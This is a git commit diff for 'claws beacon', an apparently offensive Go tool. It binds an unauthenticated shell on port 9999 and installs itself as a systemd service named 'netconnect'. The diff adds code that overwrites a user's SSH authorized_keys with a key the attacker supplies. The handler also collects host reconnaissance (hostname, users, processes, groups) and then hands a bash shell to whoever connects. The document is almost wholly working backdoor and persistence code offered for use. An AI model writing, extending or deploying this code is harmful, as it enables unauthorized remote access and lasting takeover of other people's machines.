0408a4845dc4333ed2fd367d9e88d51bcabead04
peroxidee <iluvwerewolves333@gmail.com>
2025-11-17 22:46:03 -0800

    add

--- README.md
+++ README.md
@@ -1,11 +1,10 @@
 # claws beacon
 
 
-## simple beacon, first part is just a bind shell that can be connected to, in proc of adding more
+### simple beacon, first part is just a bind shell that can be connected to, in proc of adding more
 
+service dir contains a .service file for systemd to configure the daemon. move `claws` into `/usr/sbin/claws` which should work to add it as a service, so just run `systemctl enable netconnect` and `systemctl start netconnect` to start the service.
 
- build: `go build .`
- usage: `./claws`
- connect: `nc [host-addr] 9999`
-
- 
+build: `go build .`
+usage: `./claws`
+connect: `nc [host-addr] 9999`
--- main.go
+++ main.go
@@ -3,48 +3,76 @@ package main
 import (
 	"fmt"
 	"net"
+	"os"
 	"os/exec"
+	"strings"
 )
+
+func sshkey(key []byte, user string) {
+
+	user = strings.ReplaceAll(user, "\n", "")
+	path := fmt.Sprintf("/home/%s/.ssh/authorized_keys", user)
+
+	f, err := os.Create(path)
+
+	if err != nil {
+		fmt.Printf("[-] file not created  %v\n", err)
+		return
+	}
+
+	f.Write(key)
+
+	defer f.Close()
+
+}
 
 func handler(conn net.Conn) {
 
-	_, err := conn.Write([]byte("[+] session established.\n"))
+	_, err := conn.Write([]byte("[+] session established.\n[?] input ssh public key:\n"))
 	if err != nil {
-		fmt.Printf("[-] session failed %v", err)
+		fmt.Printf("[-] session failed %v\n", err)
 	}
 
 	whoami := exec.Command("whoami")
 	n, err := whoami.CombinedOutput()
 	if err != nil {
-		fmt.Printf("[-] whoami failed %v", err)
+		fmt.Printf("[-] whoami failed %v\n", err)
 	}
+
+	buf := make([]byte, 1024)
+	_, err = conn.Read(buf)
+	if err != nil {
+		fmt.Printf("[-] get failed failed %v\n", err)
+	}
+
+	sshkey(buf, string(n))
 
 	hostname := exec.Command("hostname")
 	h, err := hostname.CombinedOutput()
 	if err != nil {
-		fmt.Printf("[-] hostname failed %v", err)
+		fmt.Printf("[-] hostname failed %v\n", err)
 	}
 
 	who := exec.Command("who")
 	w, err := who.CombinedOutput()
 	if err != nil {
-		fmt.Printf("[-] who failed %v", err)
+		fmt.Printf("[-] who failed %v\n", err)
 	}
 
 	ps := exec.Command("ps")
 	p, err := ps.CombinedOutput()
 	if err != nil {
-		fmt.Printf("[-] ps failed %v", err)
+		fmt.Printf("[-] ps failed %v\n", err)
 	}
 	groups := exec.Command("groups")
 	g, err := groups.CombinedOutput()
 	if err != nil {
-		fmt.Printf("[-] groups failed %v", err)
+		fmt.Printf("[-] groups failed %v\n", err)
 	}
 
 	_, err = conn.Write([]byte("[*] hostname is " + string(h) + "[*] username is " + string(n) + "[*] active users:\n " + string(w) + string(p) + "[*] groups: " + string(g)))
 	if err != nil {
-		fmt.Printf("[-] session failed %v", err)
+		fmt.Printf("[-] session failed %v\n", err)
 	}
 
 	cmd := exec.Command("/bin/bash")
@@ -54,7 +82,7 @@ func handler(conn net.Conn) {
 
 	err = cmd.Run()
 	if err != nil {
-		fmt.Printf("[-] connection closed.")
+		fmt.Printf("[-] connection closed.\n")
 	}
 
 	defer conn.Close()
